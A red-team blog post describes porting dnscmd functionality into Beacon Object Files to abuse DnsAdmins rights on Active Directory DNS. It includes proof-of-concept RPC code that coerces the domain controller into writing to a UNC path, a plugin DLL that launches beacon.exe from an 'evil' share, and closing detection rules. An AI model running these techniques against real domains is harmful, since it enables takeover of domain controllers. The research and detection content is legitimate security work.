# https://blog.paradoxis.nl/playing-around-with-adidns-rpc-internals-0c59c15d0a15

[Sitemap](https://blog.paradoxis.nl/sitemap/sitemap.xml)

[Open in app](https://play.google.com/store/apps/details?id=com.medium.reader&referrer=utm_source%3DmobileNavBar&source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.paradoxis.nl%2Fplaying-around-with-adidns-rpc-internals-0c59c15d0a15&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=---top_nav_layout_nav-----------------------------------------)

Get app

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Fblog.paradoxis.nl%2Fplaying-around-with-adidns-rpc-internals-0c59c15d0a15&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![Unknown user](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[**Paradoxis**](https://blog.paradoxis.nl/?source=post_page---publication_nav-acc2f50dddc5-0c59c15d0a15---------------------------------------)

·

Follow publication

Rpc

Red Team

DNS

Offensive Security

Active Directory

# Playing Around With ADIDNS RPC Internals

[![Luke Paris](https://miro.medium.com/v2/resize:fill:64:64/1*OiBE_y2bgvQ_nz1k2orWIg.jpeg)](https://medium.com/@paradoxis?source=post_page---byline--0c59c15d0a15---------------------------------------)

[Luke Paris](https://medium.com/@paradoxis?source=post_page---byline--0c59c15d0a15---------------------------------------)

Follow

20 min read

·

Jul 1, 2026

2

[Listen](https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2Fplans%3Fdimension%3Dpost_audio_button%26postId%3D0c59c15d0a15&operation=register&redirect=https%3A%2F%2Fblog.paradoxis.nl%2Fplaying-around-with-adidns-rpc-internals-0c59c15d0a15&source=---header_actions--0c59c15d0a15---------------------post_audio_button------------------)

Share

_TL;DR: I ported the functionality of_`dnscmd.exe` _into (slightly) more OPSEC safe Beacon Object Files (BOFs) so you can get domain admin rights when you manage to impersonate a user that is a member of the_`DnsAdmins` _group; or if using_`dnscmd.exe` _simply isn’t an option. You can find the full source code_ [_here_](https://github.com/Paradoxis/DNSRPC-BOF)! _Regarding the process of getting to the final result, everything that could go wrong, did go wrong (and I learned a bunch)! Many thanks to_ [_@sud0woodo_](https://visit.suspect.network/) _and_ [_@cochaviz_](https://cantpwn.com/) _and other unnamed peeps for mental support & reviewing my ramblings/detection rules_

## Some Context

A couple years ago, when I was doing an internal network penetration test at a client, I stumbled on a user which was a member of the `DnsAdmins` group. At the time, research by Shay Ber¹ had come out a few years prior showing how you could leverage these rights to gain RCE on a domain controller by loading a custom DLL file via the `ServerLevelPluginDll` config in the Active Directory Integrated DNS (ADIDNS) server.

While this research was really cool, it lacked one issue: you had to find a way to restart the DNS server. I tried a bunch of stuff, got nowhere, and moved on with my life since I had domain admin creds to capture and it just wasn’t that practical to abuse at the time.

A couple years later, I happened to run into the same attack path, and this time as Yuval Gordon from Semperni had cracked the case on how to get the server to restart². As it turns out, Microsoft has an undocumented `/restart` flag in the `dnscmd.exe` which just restarts the server and will load your DLL, all by just using the `DnsAdmins` group!

So once more, I looked around to find a way to exploit this, but this time had a different issue: on every system we checked, we just couldn’t find a copy of the `dnscmd.exe` utility installed, and since I didn’t want to pollute our client’s systems by installing optional Windows features, installing it wasn’t really worth doing unless it’s the last resort.

While I did have a nice C2 channel into the network, using the `dnscmd.exe`locally on my Windows Pentest VM, the tool just refused to work due to Kerberos and DNS getting in the way. So, yet again, I just gave up and just decided another approach would be faster, and shelved the technique yet again as “cool, but impractical”. This time around however, it left a burning question in my mind:

![](https://miro.medium.com/v2/resize:fit:500/1*Gnu4kTi5kwEgo4bT2uDSTQ.jpeg)

So, I added yet another item to my ever growing pile of stupid project ideas, since at that point we got DA another way and had to get around to finishing that damn report.

## Back To The Present

For some reason, last sunday, I was cleaning the house when for some reason this project idea just popped back into my mind. And since I now have a lot more room for R&D, I just thought, let’s give this a shot! So, monday morning, I got to work setting up a lab.

As you do, I started with Windows Server 2022, promoted it to a DC, added some test users, and enrolled my other VM where I do my actual research stuff into the domain so DNS and Kerberos would be set up properly. It was at this point when I realized:

> “Oh shit, I forgot to name my domain controller to `DC01` ! We wouldn’t want the screenshots looking bad right? I’ll just rename it quickly”

![](https://miro.medium.com/v2/resize:fit:498/1*oCBKZsQkYB0gBMjlGaWqMg.gif)

Every person with any form of Windows sysadmin experience right now

So I renamed my DC using the normal clicky click menus Microsoft provided me aaand..

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*xzPX7GJiRiCH7fNdik5Rmw.png)

Yeah I’m an idiot

After debugging for an hour, I just decided it was faster to just nuke the machine and start over. Looking back I should have taken it as a message from heavenly forces trying to warn me about what kind of a chaotic week I’d have, but hey, I’m stubborn and once I set my mind on something it’s really hard for me to let it go. So, I pressed on.

## Working Towards a POC

At first, I immediately fired up my reverse engineering tool of choice, dragged in the `dnscmd.exe` binary, at which point I thought:

> “Wait. Wasn’t there something about a technical specification somewhere in the original blog post?”

So I looked up online if there was any documentation regarding the RPC itself, and as it turns out, yes! Microsoft publicly documents them:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*rTOrijFLhyHsz9yn-WRXOA.png)

Thank you Microsoft :)

After reading through the spec a bit, it quickly dawned on me I had absolutely no clue how to get started on this project, but I just kept Googling around and continued reading up on how to actually work with the MS RPC stuff natively.

A few code examples, and a few really cool blog posts such as this [really good blog post](https://csandker.io/2021/02/21/Offensive-Windows-IPC-2-RPC.html) by [0xcsandker](https://twitter.com/0xcsandker) regarding offensive IPC internals on Windows ( _seriously go read the entire series, it’s amazing)_, and I felt comfortable enough to start writing a basic program.

Since [the Microsoft documentation stated](https://learn.microsoft.com/en-us/windows/win32/rpc/the-idl-file) that the first thing you need is an IDL definition file, I set my sights on writing one based off the publicly available spec, at which point I just thought:

![](https://miro.medium.com/v2/resize:fit:500/1*g7L_ukaav8v0OWeP503HOQ.jpeg)

And shortly after force-feeding the entire 600 page technical spec to Claude, I had a nice IDL file which contained the required structures I needed to query basic information from the server using the `R_DnssrvQuery2` API call³

```
// The final IDL code is way messier than this

typedef struct _DNS_ADDR {
    char MaxSa[32];
    unsigned long DnsAddrUserDword[8];
} DNS_ADDR, *PDNS_ADDR;

typedef struct _DNS_ADDR_ARRAY {
    unsigned long MaxCount;
    unsigned long AddrCount;
    unsigned long Tag;
    unsigned short Family;
    unsigned short WordReserved;
    unsigned long Flags;
    unsigned long MatchFlag;
    unsigned long Reserved1;
    unsigned long Reserved2;
    DNS_ADDR AddrArray[];
} DNS_ADDR_ARRAY, *PDNS_ADDR_ARRAY;

typedef struct _DNS_RPC_SERVER_INFO {
    unsigned long   dwRpcStructureVersion;
    unsigned long   dwReserved0;
    unsigned long   dwVersion;
    ... (snipped)
    unsigned char   fDefaultAgingState;
    unsigned char   fReserveArray[15];
} DNS_RPC_SERVER_INFO, *PDNS_RPC_SERVER_INFO;

typedef union _DNSSRV_RPC_UNION {
    unsigned char*          Null;
    unsigned long           Dword;
    char*                   String;
    wchar_t*                WideString;
    PDNS_RPC_SERVER_INFO    ServerInfo;
} DNSSRV_RPC_UNION;

[\
    uuid(50abc2a4-574d-40b3-9d66-ee4fd5fba076),\
    version(5.0),\
    pointer_default(unique)\
]
interface DnsServer
{
    long Opnum0();
    long Opnum1();
    long Opnum2();
    long Opnum3();
    long Opnum4();
    long Opnum5();

    long R_DnssrvQuery2(
        [in]                         handle_t        hBindingHandle,
        [in]                         unsigned long   dwClientVersion,
        [in]                         unsigned long   dwSettingFlags,
        [in, unique, string]         wchar_t*        pwszServerName,
        [in, unique, string]         char*           pszZone,
        [in, unique, string]         char*           pszOperation,
        [out]                        unsigned long*  pdwTypeId,
        [out, switch_is(*pdwTypeId)] DNSSRV_RPC_UNION* ppData
    );
}
```

Then, I just started throwing some stuff together and not too long, I had a working version which I could use to query basic server info:

```
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <rpc.h>
#include "dnsrpc.h"

#pragma comment(lib, "rpcrt4.lib")

void print_server_info(PDNS_RPC_SERVER_INFO info)
{
    wprintf(L"  Server name: %hs\n",  info->pszServerName);
    wprintf(L"  Version:     0x%08lX\n", info->dwVersion);
    // ... (snipped)
}

RPC_BINDING_HANDLE create_binding(const wchar_t *server)
{
    wchar_t binding_str[256];
    swprintf_s(binding_str, 256, L"ncacn_ip_tcp:%s", server);

    RPC_BINDING_HANDLE handle = NULL;
    RPC_STATUS status = RpcBindingFromStringBindingW((RPC_WSTR)binding_str, &handle);
    if (status != RPC_S_OK) {
        wprintf(L"RpcBindingFromStringBindingW failed: %ld\n", status);
        return NULL;
    }

    status = RpcEpResolveBinding(handle, DnsServer_v5_0_c_ifspec);
    if (status != RPC_S_OK) {
        wprintf(L"RpcEpResolveBinding failed: %ld\n", status);
        RpcBindingFree(&handle);
        return NULL;
    }

    status = RpcBindingSetAuthInfoW(
        handle,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL,
        RPC_C_AUTHZ_NAME
    );

    if (status != RPC_S_OK) {
        wprintf(L"RpcBindingSetAuthInfoW failed: %ld\n", status);
        RpcBindingFree(&handle);
        return NULL;
    }

    return handle;
}

void wmain(int argc, wchar_t *argv[])
{
    if (argc < 2) {
        wprintf(L"Usage: dnsinfo <server>\n");
        return;
    }

    RPC_BINDING_HANDLE handle = create_binding(argv[1]);
    if (!handle) {
        return;
    }

    unsigned long type_id = 0;
    DNSSRV_RPC_UNION data;
    memset(&data, 0, sizeof(data));

    long result = 0;

    RpcTryExcept
    {
        result = R_DnssrvQuery2(
            handle,
            DNS_CLIENT_VERSION_LONGHORN,
            0,
            argv[1],
            NULL,
            (unsigned char *)"ServerInfo",
            &type_id,
            &data
        );
    }
    RpcExcept(1)
    {
        wprintf(L"RPC exception: %lu\n", RpcExceptionCode());
        RpcBindingFree(&handle);
        return;
    }
    RpcEndExcept

    if (result != 0) {
        wprintf(L"R_DnssrvQuery2 failed: %ld\n", result);
        RpcBindingFree(&handle);
        return;
    }

    wprintf(L"type_id: %lu\n\n", type_id);

    if (type_id == DNSSRV_TYPEID_SERVER_INFO) {
        wprintf(L"DNS_RPC_SERVER_INFO (Longhorn):\n");
        print_server_info(data.ServerInfo);
    } else {
        wprintf(L"Unexpected type_id: %lu\n", type_id);
    }

    RpcBindingFree(&handle);
    return;
}

void __RPC_FAR *__RPC_USER MIDL_user_allocate(size_t len)
{
    return malloc(len);
}

void __RPC_USER MIDL_user_free(void __RPC_FAR *ptr)
{
    free(ptr);
}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*WgbFzbVXpaANP-QMU5ZLHg.png)

And it worked!

Awesome! Now that I had a working hello world, I could use it as a nice starting point for all other RPC calls. All I needed now was to implement:

- The `Restart` RPC call using `DnssrvOperation2` ⁴ (although using `DnssrvOperation` ⁵would have also worked).
- The `ServerLevelPluginDll`, which can be called using the same RPC calls.

> Full disclosure, I have no clue which one of the two is actually used by the legit `dnscmd.exe` , that’s for you network detection engineers to figure out :)

While these two would let me implement the code I needed, there was still one issue to overcome: which is the fact that this exploit kind of has the tendency to cripple your DNS server if you screw up _(and in turn, take down the entire AD if you’re unlucky)_. This is primarily caused by the following (documented) behavior:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*e7b2ZzARADjLPbX8FAVFXw.png)

Makes sense

In most cases this will be caused by malware authors (you) writing bad malware that blocks the `DnsPluginInitialize` ‘s thread, there’s also a slightly more subtle way your plugin can fail to load. Namely, the fact that it’s not a guarantee that the domain controller can reach whatever network share you’ll host your plugin on _(a.k.a.: your target actually knows how to firewall a Windows network properly)_.

So, as I was looking through the documentation I noted that there were a couple of RPC calls that caught my eye. The first one was the `ZoneExport` call which accepts a `pszZoneExportFile` parameter, which is used to specify the output filename. Unfortunately, this was a dead end since the RPC server just throws everything in `C:\Windows\System32\dns\` with no fun way to write outside of the directory. The second call that caught my eye was the `LogFilePath` which notes that the `pData` argument to the function call must point to a unicode string that contains an **absolute or relative pathname** or filename for the debug log file on the DNS server.

This likely also means that a UNC path can be used `\\server\share\filename.txt`, possibly resulting in an outbound connection to a server / share of our choosing. The only issue here is that while you can configure the path, it won’t write to the file by default since it likely still has it’s original file handle to the debug log file open (or doesn’t have one open in the first place). Luckily, Microsoft added the `ClearDebugLog` RPC call, which has the following remark:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*zQPJawmLe-18A1XwJUEgSQ.png)

Very nice

This means we should (in theory) be able to tell the domain controller to write a file into a UNC path of our choosing without having to restart the server, and thus not risk a crash before we know with 100% certainty that it can reach the network share.

This means we can just look for open network shares in the domain with read/write permissions and use that as a test, or set up our own over the public internet _(i.e.: using Impacket’s_`smbserver.py` _if you don’t give a crap about operational security)_.

After a bit of development, I had basic proof of concepts ready that I could use, and as it turns out, my theory about the `LogFilePath` \+ `ClearDebugLog` was correct! Using the following proof of concept let me perform a nice outbound file write, resulting in an empty file:

```
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <rpc.h>

#include "dnsrpc.h"

#pragma comment(lib, "rpcrt4.lib")

#define DNS_CLIENT_VERSION_LONGHORN 0x00070000
#define DNSSRV_TYPEID_NULL          0
#define DNSSRV_TYPEID_LPWSTR        3

RPC_BINDING_HANDLE create_binding(const wchar_t *server)
{
    wchar_t binding_str[256];
    swprintf_s(binding_str, 256, L"ncacn_ip_tcp:%s", server);

    RPC_BINDING_HANDLE handle = NULL;
    RPC_STATUS status = RpcBindingFromStringBindingW((RPC_WSTR)binding_str, &handle);
    if (status != RPC_S_OK) {
        wprintf(L"RpcBindingFromStringBindingW failed: %ld\n", status);
        return NULL;
    }

    status = RpcEpResolveBinding(handle, DnsServer_v5_0_c_ifspec);
    if (status != RPC_S_OK) {
        wprintf(L"RpcEpResolveBinding failed: %ld\n", status);
        RpcBindingFree(&handle);
        return NULL;
    }

    status = RpcBindingSetAuthInfoW(
        handle,
        NULL,
        RPC_C_AUTHN_LEVEL_PKT_INTEGRITY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL,
        RPC_C_AUTHZ_NAME
    );

    if (status != RPC_S_OK) {
        wprintf(L"RpcBindingSetAuthInfoW failed: %ld\n", status);
        RpcBindingFree(&handle);
        return NULL;
    }

    return handle;
}

void wmain(int argc, wchar_t *argv[])
{
    if (argc < 3)
    {
        wprintf(L"Usage: dnslogcoerce <server> <log_path>\n");
        return 1;
    }

    const wchar_t *server = argv[1];
    const wchar_t *log_path = argv[2];

    RPC_BINDING_HANDLE handle = create_binding(server);
    if (!handle) {
        return 1;
    }

    DNSSRV_RPC_UNION data;
    data.WideString = (wchar_t *)log_path;

    long result = 0;

    RpcTryExcept
    {
        result = R_DnssrvOperation2(
            handle,
            DNS_CLIENT_VERSION_LONGHORN,
            0,
            server,
            NULL,
            0,
            (unsigned char *)"LogFilePath",
            DNSSRV_TYPEID_LPWSTR,
            data
        );
    }
    RpcExcept(1)
    {
        wprintf(L"RPC exception setting LogFilePath: %lu\n", RpcExceptionCode());
        RpcBindingFree(&handle);
        return 1;
    }
    RpcEndExcept

    if (result != 0) {
        wprintf(L"Failed to set LogFilePath: %ld\n", result);
        RpcBindingFree(&handle);
        return 1;
    }

    wprintf(L"LogFilePath set to: %s\n", log_path);
    memset(&data, 0, sizeof(data));

    RpcTryExcept
    {
        result = R_DnssrvOperation2(
            handle,
            DNS_CLIENT_VERSION_LONGHORN,
            0,
            server,
            NULL,
            0,
            (unsigned char *)"ClearDebugLog",
            DNSSRV_TYPEID_NULL,
            data
        );
    }
    RpcExcept(1)
    {
        wprintf(L"RPC exception triggering ClearDebugLog: %lu\n", RpcExceptionCode());
        RpcBindingFree(&handle);
        return 1;
    }
    RpcEndExcept

    if (result != 0) {
        wprintf(L"ClearDebugLog failed: %ld\n", result);
        RpcBindingFree(&handle);
        return 1;
    }

    wprintf(L"ClearDebugLog called, check log file at: %s\n", log_path);

    RpcBindingFree(&handle);
    return 0;
}

void __RPC_FAR *__RPC_USER MIDL_user_allocate(size_t len)
{
    return malloc(len);
}

void __RPC_USER MIDL_user_free(void __RPC_FAR *ptr)
{
    free(ptr);
}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*2JeIcQky2_Hu2zN_OBqWhg.png)

Triggering the log write

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*0U9JxfnO5GZxJLqCCQtlAw.png)

It works!

I’ll spare you the details of implementing the `Restart` and the `ServerLevelPluginDll` as it’s effectively just the same code with different arguments _(turns out RPC development is easier than you’d think)_. If you want to see the full code, check out the [public repository](https://github.com/Paradoxis/DNSRPC-BOF) I’ve created.

## Porting Everything to BOFs

Now over for the fun (and painful) part! Porting everything to Beacon Object Files (BOFs). Since one of my goals was to be able to use a combination of token impersonation, as well as have the ability to basically run the program anywhere, I opted to port the proof of concepts I wrote into BOFs as that lets me use both things anywhere I can get any form of code running.

I (naively) just started adding the classic `MODULE$FunctionName()` everywhere using a small `API()` helper so I could easily compile the programs into regular `.exe` files as well with a single build flag. I then loaded the BOFs into TrustedSec’s COFFLoader⁶ and quickly came to the realization that this was slightly harder than initially anticipated:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*lv2JLhB4R66HO-BGMLiPlg.png)

I’m cooked

Turns out during development I had been so tunnel-visioned on getting _anything_ working at all that I had forgotten the age-old rule of BOFs: they don’t support native exception handling.

Unfortunately for me, Microsoft decided that RPC API’s make use of `RpcTryExcept` ⁷ which under the hood calls `RaiseException` ⁸ for control flow / returning error codes to users. This also means that if you remove these handlers and an RPC call fails (i.e.: you used a user’s token that is no longer valid, or they are not a member of `DnsAdmins`) the system raises an exception with code `5` (access denied) and your beacon implodes and you can wave access to your machine goodbye.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*ADvtrhKfDfUat5WdkcThwg.jpeg)

My reaction after running the COFFLoader

At this point there were a couple options I could think of:

- **Ditch the idea of BOFs and turn it into a DLL instead**— This could just mean adding support for Sliver and calling it a day (if you want to read how: [boy do I happen to have the blog post for you](https://blog.paradoxis.nl/writing-sliver-c2-extensions-in-rust-a95f620266de)). The downside here is that you basically exclude every other C2 framework out there.
- **Just build standalone CLI’s and implement token impersonation into them**— I wasn’t a big fan of this given that it’s hella OPSEC unsafe, and dropping random `.exe`’s everywhere just isn’t the classiest thing to do in a customer’s network.
- A **dd (hacky) support for exception handling to the BOF**— By far the stupidest, most time-intensive option. No sane person would pick this and just opt to use another approach.

## Adding Exception Handling to BOFs

Naturally, I picked the most masochistic option. I’m here to get BOFs working and I’m stubborn enough to die trying. My first approach was to use `setjmp` ⁹ , store the original context somewhere, hook `RaiseException` and then use `longjmp` ¹⁰, to jump back to the original location.

I also came to the realization that I could use this to then also just capture the exception code, but I had to somehow store both the old context and the return value somewhere in a predictable location.

## Get Luke Paris’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Subscribe

Remember me for faster sign in

After a bit of brainstorming with my trusted LLM it turns out that you can use the current TEB’s (Thread Environment Block) ¹¹ `ArbitraryUserPointer` for this. While this ins’t per-se the intended use of the `ArbitraryUserPointer` ¹² it could work for this particular case, and I just decided to go with it.

> Note that I am fully aware that hooking the global exception function isn’t the smartest thing to do, but hey rather have it sort of work than not work at all. If you have a better solution I’d be happy to hear it. ¯\\\_(ツ)\_/¯

Eventually I was left with code that worked about so:

- Create a wrapper function for RPC calls (i.e.: `R_DnssrvOperation2` -\> `dnsrpc_query_server_info` ) which sets up a context object and passes `R_DnssrvOperation2` to `dnsrpc_call` .
- The `dnsrpc_call` function then hooks the `RtlRaiseException`, and does it’s best to preserve the current context information using `setjmp` and stores all of this information in the TEB’s `ArbitraryUserPointer`
- We then pray to the gods and call the function provided by `dnsrpc_query_server_info`
- If an error occurs, we extract the exception code from the `EXCEPTION_RECORD` which should be passed to our detour, and try to jump back using `longjmp` .
- If no error occurs, or if we jump back, we just continue on, unhook everything again, clear up the `ArbitraryUserPointer` and act like we were never there to begin with.

I’d show the actual code but I was too laser-focussed on making a backup of the working copy that I only took screenshots since I actually didn’t ever expect this to work in the first place _(I also have a secondary reason why but you’ll find out about that one later)_. Alas, I passed the newly updated BOF into the COFFLoader:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*9KYioLzDCBai7RfGZCQ0ZA.png)

Gottem!

Very nice! Now for the real test, I decided to spin up a local Sliver stack since it’s the easiest to set up, dropped an implant, created an `extension.json` and tried out the extension code:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*_fb_7qPBqJ-6fnJoYORwew.png)

That’s never a good sign

It was at this point that I though this could actually have been related to token impersonation and I wondered “Does this even work with impersonation in the first place?” Like mentioned earlier, I had been so preoccupied with just getting anything working at all I just neglected checking if token impersonation worked as well (which is kind of the whole point of this project).

So I went back to my dev environment and used a self-written quick and dirty `impersonate.exe` to pop a shell under a second account I created, just to run into _even more_ weird behavior where the RPC connection would just not work despite having the same user token and Kerberos tickets:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*C2Su7fYHi3HZ5YBeageFhw.png)

Leftmost terminal created with CreateProcessWithTokenW, the right with \`runas\`

To make this even more confusing:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*JSJf7U1BEb8s7C72Dhlwkw.png)

Wait what? DNS is broken in my terminal created with CreateProcessWithTokenW but not the other??

Turns out that my entire network stack, for some strange reason would just not work inside of the process I created using token impersonation.

At this point I was beyond confused and just could not figure out what in the world I was doing wrong. I reached out to some people with pretty good knowledge of Windows internals and was met with the following response:

![](https://miro.medium.com/v2/resize:fit:546/1*4TQTmwGu88njiyRs8dnPgg.png)

Welp shit

Eventually I thought it could be related to `cmd.exe` somehow, so I tried launching PowerShell, which gave me even more weird errors _(note that at this point I had been stuck for multiple hours just trying to debug WTF was going on)_.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*eQ85T5bN93_Pi_f2u-VjEQ.png)

????

While I was kind of extremely confused, this error turns out to be the exact break I needed, as it led me to finding a blog post by Gee Law ¹³ which documents that this exact behavior is caused by mixing user’s environment blocks.

Since my program first elevated to `SYSTEM`, then called `CreateEnvironmentBlock` with inherit set to `true` , and only then creating a process with the token of the other user, it would result in an invalid environment being passed to the process, resulting in a broken networking stack. As it turns out, just passing `NULL` to the `lpEnvironment` of `CreateProcessWithTokenW` just fixed the issue, so I went back to debugging the actual project I was working on.

In hindsight, attaching a debugger to my implant before running the BOF would have been the smartest choice, as it revealed the root cause immediately: namely, that my naive `longjmp` might not have been as stable as I initially hoped.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*8wqFKTulS52RXpZUmXFViA.png)

Oh lord

At this point I was out of ideas so just decided to ask Claude for some good alternative ideas, at which point the LLM spat out that `RtlCaptureContext` ¹⁴ and `RtlRestoreContext` ¹⁵ may actually do what I want. Unfortunately, the official documentation on these two functions is pretty poor, but Mr LLM man gave the following explanation as to how they differ, so take this (potentially hallucinated) answer with a grain of salt:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*8k4uFJhlnQtvZnmpB13ROA.png)

I mean, makes sense based on the name

So I just switched out my `setjmp` and `longjmp` calls with `RtlCaptureContext` and `RtlRestoreContext` and tried running the code again and ran into the issue that it now would call `RtlRaiseNoncontinuableException` which was solved by just also hooking that function as well. Then, when running the BOF again in Sliver:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*RjcaQYKOZG69QlAofNnAug.png)

It works (with impersonation)!

Success! All that was left was to port the rest of the code, create a sample payload, and was left with this beautiful attack chain. So I recompiled the code, deleted the old extension, reinstalled the new one and.. wait..

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*PNAfOM4Std-pdsm5_lo5BQ.png)

where did my code go?

Yeah as it turns out when you remove an extension in sliver and it asks you to clean it up from disk, it doesn’t mean _“remove the extension binary”_, it just deletes **everything** in the directory the `extension.json` is contained in. In my case, that was the root of my project, hence **Sliver just performed a nuke from orbit on my entire codebase.**

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*_fAfSo_h4JrdkSCJSWepxw.jpeg)

Thank you BishopFox, very nice

Luckily I had pushed a copy of the code to Git when I started work in the morning as I had to transfer it from my Windows development box to my Linux development box, meaning only about 4 ish hours of work went down the drain, of which most were spent debugging. So all things considered, it could have ended up a lot worse.

> If anyone from BishopFox is reading this, I’ll accept a nice bottle of whiskey for the pain and suffering that has been inflicted upon me.

Anyhow, after re-writing the same code I did before, I compiled the code, _safely backed up the code before loading the extension into Sliver this tim_ e, set up the SMB server and tested the full chain:

```
#include <windows.h>

BOOL APIENTRY DllMain(
 HMODULE module,
 DWORD  reason_for_call,
 LPVOID reserved
) {
    return TRUE;
}

DWORD WINAPI spawn(LPVOID lpParam)
{
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessW(
        L"\\evil\\share\\beacon.exe", // opsec be damned
        NULL,
        NULL,
        NULL,
        FALSE,
        0,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}

__declspec(dllexport)
DWORD WINAPI DnsPluginInitialize(
    PVOID pDnsAllocateFunction,
    PVOID pDnsFreeFunction
) {
    HANDLE handle = CreateThread(NULL, 0, spawn, NULL, 0, NULL);
    if (handle != NULL) {
        CloseHandle(handle);
    }

    return ERROR_SUCCESS;
}

__declspec(dllexport)
DWORD WINAPI DnsPluginCleanup()
{
    return ERROR_SUCCESS;
}

__declspec(dllexport)
DWORD WINAPI DnsPluginQuery(
    PSTR pszQueryName,
    WORD wQueryType,
    PSTR pszRecordOwnerName,
    PVOID ppDnsRecordListHead
) {
    return ERROR_SUCCESS;
}
```

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:1000/1*X2O8OyCBpDAJ4yAajaDMPA.png)

Testing that the DC can reach my SMB share

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*3vOoHWgW15rMNUN_S0xNNQ.png)

Setting the plugin DLL, triggering the restart and cleaning up after the beacon is returned

And that’s about it! As you can see in the screenshot, I added one more BOF which is used to clean up any artifacts left behind on the DC, although you can always just do this manually after getting DA. Since if you forget to remove these keys you run the risk of still crippling the domain later on after you’ve cleaned up the DLL from disk.

## Wrapping Up

So in conclusion, yes, it is technically possible to use token impersonation to abuse the `DnsAdmins` edge, and perform exception handling in BOFs! It’s not the most elegant way but if you really have no other option this method can work. I also found it quite fun to play around with the RPC itself and might do some more digging into the protocol, but that’s a project for later. You can find the full source code on my GitHub:

> [https://github.com/Paradoxis/DNSRPC-BOF](https://github.com/Paradoxis/DNSRPC-BOF)

## Detection

As with any offensive blog post, it’s good form to include ways you can detect if this attack is being performed, or if you have been compromised this way.

The easiest and most straightforward method is to look for remnants of active exploitation on the domain controller. If attackers are sloppy and don’t clean up after themselves, you’ll find the following on the domain controller:

```
HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\ServerLevelPluginDll
HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters\LogFilePath
```

In addition to this, exploitation of the `Restart` RPC call can be observed in the domain controller’s event log by looking for event ID 7031 with the first parameter set to `DNS Server` under System logs:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*LePom6c8qc7FZaZ7GFUq0w.png)

Event produced by restarting the server

In addition to this, loading the plugin DLL will result in event ID 770 under the DNS Server log tabs in event viewer which contains the target DLL path in the first parameter:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*svE7N_s1vyybw-V26-Tc5Q.png)

Plugin DLL is loaded

Failed log write coercion attempts may also result in event ID 3152 which could indicate that an attacker was at least messing around with `DnsAdmins`privileges:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*sFc-uB8fuF4yk2i43kBzDQ.png)

Write errors

Lastly, you can use network based detection to look for active exploitation. I’ve added pcaps of the relevant traffic in the `pcaps` folder on GitHub including the following Suricata rules which you can use to detect active exploitation on the network level.

```
# Set a flowbit on the bind of the DNSSERVER UUID request, use this for every subsequent request that is being made
alert tcp any any -> any any (
  msg:"MRLN-SRT - DCERPC DNSSERVER Bind Request Flowbit";
  flow:established,to_server;
  content:"|05 00 0b|"; offset:0; depth:3;
  content:"|a4 c2 ab 50 4d 57 b3 40 9d 66 ee 4f d5 fb a0 76|"; offset:32; depth:16; fast_pattern;
  flowbits:set,dcerpc.dnsserver_bind;
  flowbits:noalert;
  threshold:type limit,track by_src,count 1,seconds 600;
  classtype:not-suspicious; reference:url, https://github.com/Paradoxis/DNSRPC-BOF; priority:3; sid:1000009; rev:1;
)

alert tcp any any -> any any (
  msg:"MRLN-SRT - Suspicious MS-DNSP (ADIDNS RPC) restart request observed";
  flow:established,to_server;
  flowbits:isset,dcerpc.dnsserver_bind;
  content:"|05 00 00 03|"; offset:0; depth:4;
  content:"|05 00|"; distance:18; within:2;
  content:"Restart"; distance:0; nocase; fast_pattern;
  threshold:type limit,track by_src,count 1,seconds 600;
